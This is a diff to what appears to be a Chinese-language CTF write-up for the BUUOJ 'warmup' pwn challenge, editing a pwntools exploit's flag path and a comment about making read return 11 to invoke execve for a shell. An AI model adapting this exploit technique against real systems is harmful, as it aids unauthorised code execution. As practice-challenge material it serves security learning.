@@ -367,7 +367,7 @@ icon: icon-html
   from pwn import *
   #r = remote('pwn.buuoj.cn', 20000)
   r = process('warmup')
-  flag = '/home/warmup/flag.txt\x00'
+  flag = '/flag\x00'
   fuck_addr = 0x8049200
   read = 0x804811d
   write = 0x8048135
@@ -385,7 +385,7 @@ icon: icon-html
   r.interactive()
   ```
 
-  本地能跑出来远程跑不成，gg
+  起shell也行
 
   read返回值搞出execve系统调用号11
 
